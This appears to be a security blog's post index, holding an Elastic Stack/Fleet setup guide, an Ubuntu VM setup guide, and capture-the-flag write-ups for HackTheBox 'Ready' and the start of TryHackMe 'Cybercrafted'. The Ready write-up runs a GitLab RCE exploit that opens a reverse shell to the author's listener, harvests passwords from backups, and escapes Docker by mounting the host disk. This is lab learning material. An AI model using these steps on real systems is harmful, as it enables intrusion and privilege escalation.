Fleet Server host (https://SERVER_IP:8220). Be sure to click Add host.On Step 5, click Generate service tokenNow we come to the last step. Here’s where we’ll change a few things. We’ll need to add our certificates we created for our Fleet Server. And since this is a Debian package installation of Elastic Agent, we’ll need to use enroll instead of install and we’ll have to manually start the Elastic Agent after the Agent enrolls.Here is the template to enroll the agent:sudo elastic-agent enroll -f \\--url=https://192.168.235.130:8220 \\--fleet-server-es=https://192.168.235.130:9200 \\--fleet-server-service-token=AAEAAWVsYXN0aWMvZmxlZXQtc2VydmVyL3Rva2VuLTE2NDg0MDQ5MjQ0OTg6cWRjN0lLNWZTaDJJbnVkb0NWTTgzQQ \\--fleet-server-policy=fleet-server-policy \\--fleet-server-es-ca-trusted-fingerprint=dd9d32e7c53bbc30c56a740db3752c01db7545d5bb9c8e951fc446747994192c \\--certificate-authorities=/etc/elasticsearch/certs/ca/ca.crt \\--fleet-server-cert=/etc/elastic-agent/certs/fleet-server/fleet-server.crt \\--fleet-server-cert-key=/etc/elastic-agent/certs/fleet-server/fleet-server.keyStep 6 provides the necessary info for the variables (SERVER_IP, FLEET_SERVICE_TOKEN, and ELASTICSEARCH_CA_FINGERPRINT) that need replacing. If you have followed the guide exactly so far, the certificate and keys should be in the same place.Replace the needed values and paste the command into the server where Agent is installed and run it.You should see a message that reads Elastic Agent has been enrolled. If you see that, now all that needs to happen is to start the Agent:sudo service elastic-agent startIf we go back to Kibana, we should see that the Fleet Server has connected. Click continue and now we can view our Agent(s)!Elastic AgentWith our Fleet Server up and running, we can now install Agents on systems we want to monitor and have them managed by our Fleet Server. For this Example, I’m going to test this on a Windows 11 VM. You can download an image here: https://developer.microsoft.com/en-us/windows/downloads/virtual-machines/. Just remember to ensure that the Network is configured for NAT just like the Ubuntu Server if you’re following along with the Ubuntu Server VM setup.I would also like to try out the Network Packet Capture integration, which for Windows requires Npcap to be installed. Then we’ll also need to download Packetbeat. Here is a list items that needs to be downloaded on the Windows host: File Link Elastic Agent https://artifacts.elastic.co/downloads/beats/elastic-agent/elastic-agent-8.1.1-windows-x86_64.zip Npcap https://npcap.com/dist/npcap-1.60.exe Packetbeat https://artifacts.elastic.co/downloads/beats/packetbeat/packetbeat-8.1.1-windows-x86_64.ziphttps://artifacts.elastic.co/downloads/beats/packetbeat/packetbeat-8.1.1-windows-x86_64.zip.sha512https://artifacts.elastic.co/downloads/beats/packetbeat/packetbeat-8.1.1-windows-x86_64.zip.asc First we’ll install Npcap on Windows. Install it with all of the selected defaults. Keep hitting Next until it finishes.Our Agent will need a policy to enroll in. Then we can add integrations to that policy. In Kibana go back to Fleet and click on Agent policies then Create agent policyGive the policy a name and click Create agent policy.Once the policy is created, click on the policy name then click Add integrationThe integrations I’d like to add are the Endpoint Security as well as the Network Packet Capture. Endpoint Security should be at the top of the integration page. Click on it then click Add Endpoint SecurityIn Step 1 give the Integration a name. In Step 2, make sure that the tab Existing hosts is selected and the policy that we created is selected in Agent policy. Then click Save and continueYou’ll be prompted to Add Elastic Agent to your hosts, but we still need to add another integration. Select Add Elastic Agent later. Follow the same steps to add the Network Packet Capture integration. You can get back to integrations by selecting it under Management right above Fleet or the big blue button that appears at the bottom of the sidebar.In the search bar, type Network Packet Capture and add the integration to our policy.Now we can go ahead and Add Elastic Agent to your hosts here, or we can go back to our Fleet and add an agent there.In Step 1, make sure our policy with Endpoint Security and Network Packet Capture is selected. Ignore Step 2. In Step 3, Select Windows.Before we copy and paste the command into Windows, we need to extract the contents of the elastic-agent zip file we downloaded. Then we need to copy and paste the three Packetbeat files we downloaded and paste them into the the newly extracted folder elastic-agent-8.1.1-windows-x86_64\\data\\elastic-agent-7f30bb\\downloads\\Then we need to open a PowerShell or Cmd window with Administrator privileges. Navigate inside of the extracted elastic-agent-8.1.1-windows-x86_64\\ directory. There should be an elastic-agent.exe executable there. Then we can copy and paste the command from Kibana.We’ll need to add a --insecure at the end of the command to enroll the Agent and to avoid an untrusted certificate error since these certs are self-signed.If everything enrolled correctly, you should see the output:Successfully enrolled the Elastic Agent.Elastic Agent has been successfully installed.Then in Kibana we should see our new, healthy AgentNow if we head over to Security in Kibana, we can check out Host and Network activity. Then we can load prebuilt Elastic rules under Detect and enable them.There are also some pre-built Dashboards you can use to visualize the data coming in.All-In-One Script Installhttps://github.com/gore-ez-knee/awesome-scripts/tree/main/elastic-quickstart-bare-metalIf you would like to setup up a single stack quickly and painlessly, I threw all of the commands into a script. Being that I installed this on a Debian/Ubuntu server, the script has been setup to install Debian packages only. Also this only works for Elastic version 8.0.0+ because Elastic v8 automatically creates TLS certificates for Elasticsearch communication and I haven’t put checks in to create and update Elasticsearch should someone want to install an older version.The script requires that some sudo commands be run. This is for enabling services to autostart as well as modifying /etc files.It also generates self-signed certificates to enable TLS between Kibana and one’s browser as well as for Fleet Server.UPDATE 18 Apr 2022Modified the script to automatically setup Fleet Server. I eventually realized I could use a proxy (Burp Suite) to capture the API calls used when manually setting up Fleet through the UI. Then I could create curl commands to set everything up in the script.Still working on getting this setup with Docker the same way…When ran, the output should look similar to this:elastic-user@elastic:~$ sudo ./elastic_stack.sh[sudo] password for elastic-user:Select a number corresponding to the version you&#39;d like to download:0) 8.1.21) 8.1.12) 8.1.03) 8.0.14) 8.0.0Enter number: 0Select a number corresponding the Server&#39;s IP: 0) 192.168.235.133Enter a number: 0[*] Downloading Elasticsearch 8.1.1...[*] Elasticsearch 8.1.1 Download Successful![*] Installing Elasticsearch 8.1.1...[+] Elasticsearch 8.1.1 Installed![!] Important output saved in elasticsearch_install.out[*] Enabling Elasticsearch to autostart...[*] Starting Elasticsearch...[+] Successful Connection to Elasticsearch! :)[*] Generating Kibana Enrollment Token...[*] Downloading Kibana 8.1.1...[*] Kibana 8.1.1 Download Successful![*] Installing Kibana 8.1.1...[+] Kibana Installed![*] Setting Up Kibana with Elasticsearch...[+] Kibana Successfully Setup with Elasticsearch[?] Would you like to add a password to your self-signed keys?(y/n): yPassword:Password (again):[*] Creating self-signed certificates...[+] Certificates created![*] Modifying kibana.yml with new settings...[*] Generating Encryption Keys for Kibana and writing them to kibana.yml[*] Enabling Kibana to autostart...[*] Starting Kibana...================================================================== Elasticsearch &amp;amp; Kibana Installed ==================================================================[*] Now go to https://SERVER_IP:5601[*] Login with: Username: elastic Password: Z=9ZGo9Kgva3Rg1EsDpA================================================================[?] Would you like to setup a Fleet Server?(y/n): y[*] Downloading Elastic Agent 8.1.1...[*] Elastic Agent 8.1.1 Download Successful![*] Installing Elastic Agent 8.1.1...[+] Elastic agent 8.1.1 Installed![*] Generating a CA to create Fleet Server Certificates[!] Need to install Unzip binary[*] Creating Certificates for Fleet Server[*] Setting Up Fleet Agent Policy...DONE[*] Snagging Service Token...DONE[*] Getting Elasticsearch CA Fingerprint...DONE[*] Adding Fleet Server host...DONE[*] Enrolling Fleet...DONE================================================================== Fleet Server Installed ==================================================================To change the superuser password or generate enrollment tokens to add additional Elasticsearch nodes, the script outputs the initial config output to the file elasticsearch_install.out which gives the needed commands." }, { "title": "Ubuntu Server Setup", "url": "/posts/ubuntu-server-setup/", "categories": "Misc", "tags": "ubuntu, server, setup, vmware", "date": "2022-03-24 14:30:00 -0500", "snippet": "Here is a guide I created to stand up an Ubuntu Server to test standing up an Elastic Stack. Downloaded the Ubuntu Server iso: https://ubuntu.com/download/server Using VMware Workstation, we “Create a New Virtual Machine” On the Welcome Wizard, choose Typical(recommended) and click Next Next select “Installer disc image file (iso)” and browse to the path of the Ubuntu server iso you just downloaded and click Next VMware Workstation wants to do an “Easy Install”, but I found I had to input the same information during setup anyways so inputting anything here might be pointless. Name the machine and location you’d like to save the VM Just use the defaults selected and click Next Here, just make sure the Network Adapter is set to NAT. You can adjust the memory or CPUs here too if you’d like. Then click Finish Working through the installation prompts: I pick my language English, I keep the Keyboard Configuration Layout as English (US), keep the default Network connection interface created, leave the Proxy address blank, leave the Mirror address alone, keep the storage configuration to what it is, and finally click Done. It will ask if you are sure you want to continue. Cick continue. Here’s where the “Easy Setup” wizard should’ve used the information you provided it, but clearly it doesn’t. Perhaps it’s for a normal Ubuntu installation and not for the server install. Anyways just fill in the information again and click Done. Ignore the Ubuntu Advantage Token. Click Done For SSH Setup, I chose to Install OpenSSH server. I’m not worried about using keys here, because I’m just testing this on a VM that’s NAT’d on my home computer. On the next page you can install some popular server snaps. I’m not going to install anything extra now. I’ll worry about that later. Click Done and wait for everything to update. Once the update is finished, Reboot Now should appear where Cancel update and reboot was. Select Reboot Now and hit Enter If the reboot seems to have finished, but there isn’t a prompt for login, hit Enter. Now go ahead and login with the username and password you setup earlier. Take note of the IP address under System information. Open up a terminal on your host machine and attempt to SSH to the server using the IP of the server. I’m using WSL on Windows Terminal You should be able to successfully SSH to the VM Ubuntu Server Now would be a really good time to take a snapshot of the Ubuntu ServerWith this setup, I’m going to setup an Elastic Stack to start pulling in logs from other systems. You can follow along that journey here" }, { "title": "Ready", "url": "/posts/ready/", "categories": "HackTheBox", "tags": "htb, gitlab, docker", "date": "2022-02-19 23:00:00 -0600", "snippet": "ReadyEnumeration$ sudo nmap -sC -sV -oA nmap/ready 10.10.10.220 Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-04 23:50 EDTNmap scan report for 10.10.10.220Host is up (0.066s latency).Not shown: 998 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)| 256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)|_ 256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)5080/tcp open http nginx| http-robots.txt: 53 disallowed entries (15 shown)| / /autocomplete/users /search /api /admin /profile | /dashboard /projects/new /groups/new /groups/*/edit /users /help |_/s/ /snippets/new /snippets/*/edit| http-title: Sign in \\xC2\\xB7 GitLab|_Requested resource was http://10.10.10.220:5080/users/sign_in|_http-trane-info: Problem with XML parsing of /evox/aboutService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 15.84 secondsGitLabAfter completing the Laboratory Box, I knew you could checkout the /help page to get a version number of GitLab.Huh, I guess you have to create a user first.After creating a user y00ser:password123, I login and return to the /help page to see a GitLab Community Edition version number 11.4.7FootholdUsing searchsploit to see if there are any available exploits for GitLab shows some promise. There appears to be two python scripts that can give us remote code execution (RCE).$ searchsploit gitlab---------------------------------------------------- --------------------------------- Exploit Title | Path---------------------------------------------------- ------------------------------------[snip]---GitLab 11.4.7 - RCE (Authenticated) (2) | ruby/webapps/49334.pyGitLab 11.4.7 - Remote Code Execution (Authenticate | ruby/webapps/49257.py---[snip]---I copy one of the scripts to my current directory with searchsploit -m ruby/webapps/49334.py.I use the scripts -h flag to see what arguments are needed:$ python3 49334.py -husage: 49334.py [-h] -u U -p P -g G -l L -P PGitLab 11.4.7 RCEoptional arguments: -h, --help show this help message and exit -u U GitLab Username/Email -p P Gitlab Password -g G Gitlab URL (without port) -l L reverse shell ip -P P reverse shell portSo I supply the script with the needed arguments, run nc -lvnp 9001 on another shell tab, and execute the script:$ python3 49334.py -u y00ser -p password123 -g http://10.10.10.220 -l 10.10.14.2 -P 9001 [+] authenticity_token: UURyorKkxmg8KQUkog7skIQdeZjNQv4qATa83Enyb7VaC+97Op4Bcz4zX/+NLei82VB96whWqpaXApdGIMlQGw==[+] Creating project with random name: project4017[+] Running Exploit[+] Exploit completed successfully!And on my nc tab, I see the connection, but no output. I run some simple commands and see if python is installed on the system. Then I create a better looking shell.$ nc -lvnp 9001 listening on [any] 9001 ...connect to [10.10.14.2] from (UNKNOWN) [10.10.10.220] 42046whoamigitwhich pythonwhich python3/opt/gitlab/embedded/bin/python3/opt/gitlab/embedded/bin/python3 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;git@gitlab:~/gitlab-rails/working$ I tried make the shell more stable by backgrounding the session, running stty raw -echo and returning to the process, but my entire bash screen would freeze so I abandoned trying to get it to work. So I guess I won’t have tab completion. That’s okay.Looking Back: It might’ve worked if I ran stty raw -echo; fg.UserInitally I believed this was going to be similar to Laboratory, so I used what I had learned and made my user an admin. Using gitlab-rails console:gitlab-rails console------------------------------------------------------------------------------------- GitLab: 11.4.7 (98f8423) GitLab Shell: 8.3.3 postgresql: 9.6.8-------------------------------------------------------------------------------------Loading production environment (Rails 4.2.10)irb(main):001:0&amp;gt; user = User.find_by(username: &#39;y00ser&#39;)user = User.find_by(username: &#39;y00ser&#39;)=&amp;gt; #&amp;lt;User id:7 @y00ser&amp;gt;irb(main):002:0&amp;gt; user.admin = trueuser.admin = true=&amp;gt; trueirb(main):003:0&amp;gt; user.save!user.save!=&amp;gt; trueAlso while I’m here, I’d like to check out the user dude who I saw in the /etc/passwd file. Listing out his attributes, I find a password hash:irb(main):006:0&amp;gt; u = User.find(2)u = User.find(2)=&amp;gt; #&amp;lt;User id:2 @dude&amp;gt;irb(main):007:0&amp;gt; pp u.attributespp u.attributes{&quot;id&quot;=&amp;gt;2, &quot;email&quot;=&amp;gt;&quot;dude@ready.com&quot;, &quot;encrypted_password&quot;=&amp;gt; &quot;$2a$10$NOMTXhO31vqykicMa6zj3O.F5PIyI9q/S4c.v22eMSfXNDdtpI2Mm&quot;,It appears it’s a bcrypt password so I don’t think I’m going to be able to decrypt it anytime soon.I logged back into GitLab and explored the users, projects, repositories in the admin panel to find anything of value, but didn’t find anything. So this doesn’t look like it’ll be exactly like Laboratory.Checking out the home directory, there is only one user dude. Inside is the user flag:git@gitlab:~/gitlab-rails/working$ cd /homecd /homegit@gitlab:/home$ lslsdudegit@gitlab:/home$ cd dudecd dudegit@gitlab:/home/dude$ lslsuser.txtgit@gitlab:/home/dude$Viewing the contents of the root directory / gives us a clue that we are inside of a docker containergit@gitlab:/$ ls -alls -altotal 104drwxr-xr-x 1 root root 4096 Dec 1 12:41 .drwxr-xr-x 1 root root 4096 Dec 1 12:41 ..-rwxr-xr-x 1 root root 0 Dec 1 12:41 .dockerenv-rw-r--r-- 1 root root 185 Nov 20 2018 RELEASEdrwxr-xr-x 2 root root 4096 Nov 20 2018 assetsdrwxr-xr-x 1 root root 4096 Dec 1 15:40 bindrwxr-xr-x 2 root root 4096 Apr 12 2016 bootdrwxr-xr-x 13 root root 3760 May 4 18:16 devdrwxr-xr-x 1 root root 4096 Dec 2 10:45 etcdrwxr-xr-x 1 root root 4096 Dec 2 10:45 homedrwxr-xr-x 1 root root 4096 Sep 13 2015 libdrwxr-xr-x 2 root root 4096 Nov 13 2018 lib64drwxr-xr-x 2 root root 4096 Nov 13 2018 mediadrwxr-xr-x 1 root root 4096 May 5 14:08 mntdrwxr-xr-x 1 root root 4096 Dec 1 16:23 optdr-xr-xr-x 401 root root 0 May 4 18:16 procdrwx------ 1 root root 4096 Dec 13 15:06 root-rw-r--r-- 1 root root 23 Jun 29 2020 root_passdrwxr-xr-x 1 root root 4096 Dec 13 15:07 rundrwxr-xr-x 1 root root 4096 Nov 19 2018 sbindrwxr-xr-x 2 root root 4096 Nov 13 2018 srvdr-xr-xr-x 13 root root 0 May 4 18:16 sysdrwxrwxrwt 1 root root 4096 May 5 14:34 tmpdrwxr-xr-x 1 root root 4096 Nov 13 2018 usrdrwxr-xr-x 1 root root 4096 Nov 13 2018 vargit@gitlab:/$We see a .dockerenv file which tips us off. There’s also a very interesting file called root_pass inside of the root directory:git@gitlab:/$ cat root_passcat root_passYG65407Bjqvv9A0a8Tm_7wI wonder if we can use that to switch user su to root:git@gitlab:/$ su - rootsu - rootPassword: YG65407Bjqvv9A0a8Tm_7wsu: Authentication failuregit@gitlab:/$Nope, I guess that won’t work. This is the point I go down several rabbit holes, but ultimately this comes down to knowing what’s normal and what isn’t normal on a linux filesystem. I used LinPEAS to enumerate for me and I glanced over the directory I should’ve looked at. We can see a lot of our stuff is in /var/opt/gitlab but there is another directory we see a few things in too, which is /opt/gitlab. Normally you don’t see a lot of things in /opt. /opt is used for “the installation of add-on application software packages.” But if you were to check out your /opt directory on your attack box now, you probably wouldn’t see but maybe one or two items in there. Try running echo $PATH and you probably won’t see /opt in there either. But remember when I ran which python3? The python3 binary was in /opt/gitlab/embedded/bin. In fact if I were to run echo $PATH on this box I would see:git@gitlab:/$ echo $PATHecho $PATH/opt/gitlab/embedded/lib/ruby/gems/2.4.0/bin:/opt/gitlab/bin:/opt/gitlab/embedded/bin:/bin:/usr/binThere seems to be some important stuff in /opt. Of course this is hindsight now, but it shows the importance of knowing what you should normally see on a box. So let’s see what is in /opt:ls -al /opttotal 24drwxr-xr-x 1 root root 4096 Dec 1 16:23 .drwxr-xr-x 1 root root 4096 Dec 1 12:41 ..drwxr-xr-x 2 root root 4096 Dec 7 09:25 backupdrwxr-xr-x 1 root root 4096 Dec 1 12:41 gitlabBackups have a tendency to show some goodies. Let’s see if there is a password inside any of these files. I start broad and work my way down:First I grep for password across all files in the directory:git@gitlab:/opt/backup$ grep &#39;password&#39; *grep &#39;password&#39; *docker-compose.yml: gitlab_rails[&#39;initial_root_password&#39;]=File.read(&#39;/root_pass&#39;)gitlab.rb:#### Email account passwordgitlab.rb:# gitlab_rails[&#39;incoming_email_password&#39;] = &quot;[REDACTED]&quot;gitlab.rb:# password: &#39;_the_password_of_the_bind_user&#39;gitlab.rb:# password: &#39;_the_password_of_the_bind_user&#39;gitlab.rb:# &#39;/users/password&#39;,gitlab.rb:#### Change the initial default admin password and shared runner registration tokens.gitlab.rb:# gitlab_rails[&#39;initial_root_password&#39;] = &quot;password&quot;gitlab.rb:# gitlab_rails[&#39;db_password&#39;] = nilgitlab.rb:# gitlab_rails[&#39;redis_password&#39;] = nilgitlab.rb:gitlab_rails[&#39;smtp_password&#39;] = &quot;wW59U!ZKMbG9+*#h&quot;gitlab.rb:# gitlab_shell[&#39;http_settings&#39;] = { user: &#39;username&#39;, password: &#39;password&#39;, ca_file: &#39;/etc/ssl/cert.pem&#39;, ca_path: &#39;/etc/pki/tls/certs&#39;, self_signed_cert: false}gitlab.rb:##! `SQL_USER_PASSWORD_HASH` can be generated using the command `gitlab-ctl pg-password-md5 gitlab`gitlab.rb:# postgresql[&#39;sql_user_password&#39;] = &#39;SQL_USER_PASSWORD_HASH&#39;gitlab.rb:# postgresql[&#39;sql_replication_password&#39;] = &quot;md5 hash of postgresql password&quot; # You can generate with `gitlab-ctl pg-password-md5 &amp;lt;dbuser&amp;gt;`gitlab.rb:# redis[&#39;password&#39;] = &#39;redis-password-goes-here&#39;gitlab.rb:####! **Master password should have the same value defined ingitlab.rb:####! redis[&#39;password&#39;] to enable the instance to transition to/fromgitlab.rb:# redis[&#39;master_password&#39;] = &#39;redis-password-goes-here&#39;gitlab.rb:# geo_secondary[&#39;db_password&#39;] = nilgitlab.rb:# geo_postgresql[&#39;pgbouncer_user_password&#39;] = nilgitlab.rb:# password: PASSWORDgitlab.rb:###! generate this with `echo -n &#39;$password + $username&#39; | md5sum`gitlab.rb:# pgbouncer[&#39;auth_query&#39;] = &#39;SELECT username, password FROM public.pg_shadow_lookup($1)&#39;gitlab.rb:# password: MD5_PASSWORD_HASHgitlab.rb:# postgresql[&#39;pgbouncer_user_password&#39;] = nilgit@gitlab:/opt/backup$docker-compose.yml references the root_pass file in the root directory, but it also looks like gitlab.rb has quite a few hits on password as well.Now we drill down to find password in gitlab.rb, but we want to remove results that start with a # since those are comments in the file and don’t mean anything to us:git@gitlab:/opt/backup$ grep &#39;password&#39; gitlab.rb | grep -v &#39;^#&#39;grep &#39;password&#39; gitlab.rb | grep -v &#39;^#&#39;gitlab_rails[&#39;smtp_password&#39;] = &quot;wW59U!ZKMbG9+*#h&quot;That shows us something interesting. Perhaps we can use this to get docker root:git@gitlab:/opt/backup$ su - rootsu - rootPassword: wW59U!ZKMbG9+*#hroot@gitlab:~#Success!RootAdmittedly, I started looking at breakout attempts before I privesc’d to docker root. When reviewing the LinePEAS output, it showed caps that were enabled. Most of what I found on the web would reference a pretty simple way to gain root on the host box with certain capabilities enabled, which in this case looked like everything. I eventually fell on this hacktricks which, with SYS_ADMIN capability enabled, could allow the docker container to “mount the host disk and access it freely.”Oh and if you want to see what capabilites are enabled for you, just run capsh --printroot@gitlab:~# capsh --printcapsh --printCurrent: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37+eipBounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37Securebits: 00/0x0/1&#39;b0 secure-noroot: no (unlocked) secure-no-suid-fixup: no (unlocked) secure-keep-caps: no (unlocked)uid=0(root)gid=0(root)groups=0(root)root@gitlab:~#Following along wih the instructions from the site:root@gitlab:/# fdisk -l---[snip]---Device Start End Sectors Size Type/dev/sda1 2048 4095 2048 1M BIOS boot/dev/sda2 4096 37746687 37742592 18G Linux filesystem/dev/sda3 37746688 41940991 4194304 2G Linux swaproot@gitlab:/# mkdir /mnt/holemkdir /mnt/holeroot@gitlab:/# cd /mnt cd /mntroot@gitlab:/mnt# lslsholeroot@gitlab:/mnt# mount /dev/sda2 holemount /dev/sda2 holeroot@gitlab:/mnt# cd holecd holeroot@gitlab:/mnt/hole# lslsbin cdrom etc lib lib64 lost+found mnt proc run snap sys usrboot dev home lib32 libx32 media opt root sbin srv tmp varroot@gitlab:/mnt/hole# chroot ./ bashchroot ./ bashroot@gitlab:/# whoamiwhoamirootroot@gitlab:/# cd /rootcd /rootroot@gitlab:~# lslsdocker-gitlab ready-channel root.txt snaproot@gitlab:~#And there it is. That’s Ready." }, { "title": "Cybercrafted", "url": "/posts/cybercrafted/", "categories": "TryHackMe", "tags": "tryhackme, sqli, sqlmap, ssh2john, screen", "date": "2022-02-13 09:00:00 -0600", "snippet": "IntroCybercraftedThis is a medium TryHackMe box which houses a Mincraft server. We enumerate subdomains and pages across those subdomains to find a vulnerable page. We find one of those pages is vulnerable to SQL injection which gives us credentials to login to an admin panel. This login brings us to a page which allows us to execute commands on the server. From there we can spawn a reverse shell to access the box and find an exposed ssh private key. With that we extract the passphrase hash off of the key, crack it, and ssh onto the box as the admin. From there we find credentials leaked in a log file which allows to switch to another user. That user is allowed to run a sudo command which allows us to spawn a root shell.EnumerationNmapTo get started, we begin with an nmap of the machine to find any open ports. I like to find all open ports to begin with, but it can be very time consuming. This nmap scan seems to work well within these isolated learning environmets to quickly find open ports on a system:sudo nmap -v --min-rate 10000 10.10.70.248 -p-Starting Nmap 7.60 ( https://nmap.org ) at 2021-11-21 03:07 GMTInitiating ARP Ping Scan at 03:07Scanning 10.10.70.248 [1 port]Completed ARP Ping Scan at 03:07, 0.22s elapsed (1 total hosts)Initiating SYN Stealth Scan at 03:07Scanning admin.cybercrafted.thm (10.10.70.248) [65535 ports]Discovered open port 80/tcp on 10.10.70.248Discovered open port 22/tcp on 10.10.70.248Discovered open port 25565/tcp on 10.10.70.248Completed SYN Stealth Scan at 03:07, 8.76s elapsed (65535 total ports)Nmap scan report for admin.cybercrafted.thm (10.10.70.248)Host is up (0.00059s latency).Not shown: 65532 closed portsPORT STATE SERVICE22/tcp open ssh80/tcp open http25565/tcp open minecraftMAC Address: 02:62:A3:C2:8E:83 (Unknown)Read data files from: /usr/bin/../share/nmapNmap done: 1 IP address (1 host up) scanned in 9.12 seconds Raw packets sent: 85547 (3.764MB) | Rcvd: 85547 (3.422MB)This answers the first question. How many ports are open?Now that we know what the ports are, we can run some default scripts against them to tell us more information about the services those ports are hosting:sudo nmap -A 10.10.70.248 -p22,80,25565Starting Nmap 7.60 ( https://nmap.org ) at 2021-11-21 03:13 GMTNmap scan report for admin.cybercrafted.thm (10.10.70.248)Host is up (0.00046s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 37:36:ce:b9:ac:72:8a:d7:a6:b7:8e:45:d0:ce:3c:00 (RSA)| 256 e9:e7:33:8a:77:28:2c:d4:8c:6d:8a:2c:e7:88:95:30 (ECDSA)|_ 256 76:a2:b1:cf:1b:3d:ce:6c:60:f5:63:24:3e:ef:70:d8 (EdDSA)80/tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: Log In25565/tcp open minecraft Minecraft 1.7.2 (Protocol: 127, Message: ck00r lcCyberCraftedr ck00rrck00r e-TryHackMe-r ck00r, Users: 0/1)MAC Address: 02:62:A3:C2:8E:83 (Unknown)Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portAggressive OS guesses: Linux 3.8 (95%), Linux 3.1 (94%), Linux 3.2 (94%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.2 - 4.8 (92%)No exact OS matches for host (test conditions non-ideal).Network Distance: 1 hopService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelTRACEROUTEHOP RTT ADDRESS1 0.46 ms admin.cybercrafted.thm (10.10.70.248)OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 12.45 secondsThe output here shows us what is running on the highest port. What service runs on the highest port?In the traceroute section of the output, we see a domain address admin.cybercrafted.thm. We’ll add this to our /etc/hosts to access the site via virtual routing.SubdomainsViewing the results of the Nmap output, we know that this server is hosting an http service. Typing the address http://10.10.70.248 into the address bar of our browser returns an error:It appears to be redirecting to http://cybercrafted.thm. We’ll add this to our /etc/hosts file as well and retry the site.The next question is asking if there are any subdomains. We’ve already seen one in the Nmap results, admin.cybercrafted.thm, but how would we find more? For this challenge I’m going to use gobuster. This server appears to already be virtually hosting a subdomain of admin so we’ll use gobusters vhost mode to enumerate potential subdomains. A great resource in wordlists is Daniel Miesslers SecLists. If you aren’t using TryHackMe’s AttackBox, I’d recommend installing it on your own attack machine.gobuster vhost -u cybercrafted.thm -w /usr/share/wordlists/SecLists/Discovery/DNS/shubs-subdomains.txt ===============================================================Gobuster v3.0.1by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)===============================================================[+] Url: http://cybercrafted.thm[+] Threads: 10[+] Wordlist: /usr/share/wordlists/SecLists/Discovery/DNS/shubs-subdomains.txt[+] User Agent: gobuster/3.0.1[+] Timeout: 10s===============================================================2021/11/21 03:53:23 Starting gobuster===============================================================Found: store.cybercrafted.thm (Status: 403) [Size: 287]Found: admin.cybercrafted.thm (Status: 200) [Size: 937]Found: www.store.cybercrafted.thm (Status: 403) [Size: 291]Found: www.admin.cybercrafted.thm (Status: 200) [Size: 937]---[snip]---This is where I admittedly kept running into consistency issues. I used several wordlists under the /DNS directory and found the same couple of domains popping up: store and admin. Currently there is no way to filter out status codes using vhost mode on gobuster so there are times where the output gets flooded with 400 status codes. With the final subdmain shown to be three characters, I guess it was the most common one being www and it turned out to be correct. So far this should be what our /etc/hosts file looks like:127.0.0.1 localhost127.0.1.1 tryhackme.lan tryhackme10.10.70.248 admin.cybercrafted.thm store.cybercrafted.thm www.cybercrafted.thm cybercrafted.thm# The following lines are desirable for IPv6 capable hosts::1 localhost ip6-localhost ip6-loopbackff02::1 ip6-allnodesff02::2 ip6-allrouters Any subdomains? (Alphabetical order)DirectoriesNext up comes finding what directories/pages on on these domains. We’ll use gobusters dir mode to do this. First we’ll start with www.cybercrafted.thmgobuster dir -u http://www.cybercrafted.thm/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt -s 200,301,302 -x html===============================================================Gobuster v3.0.1by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)===============================================================[+] Url: http://www.cybercrafted.thm/[+] Threads: 10[+] Wordlist: /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt[+] Status codes: 200,301,302[+] User Agent: gobuster/3.0.1[+] Extensions: html[+] Timeout: 10s===============================================================2021/11/21 04:08:35 Starting gobuster===============================================================/index.html (Status: 200)/assets (Status: 301)/. (Status: 200)/secret (Status: 301)===============================================================2021/11/21 04:08:43 Finished===============================================================Oh secrets??Oh…They are only pictures. Perhaps there’s hidden info embedded within the images, but we’ll shelve that for now. Let’s keep looking for other pages. Next up is admin.cybercrafted.thm:gobuster dir -u http://admin.cybercrafted.thm/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt -s 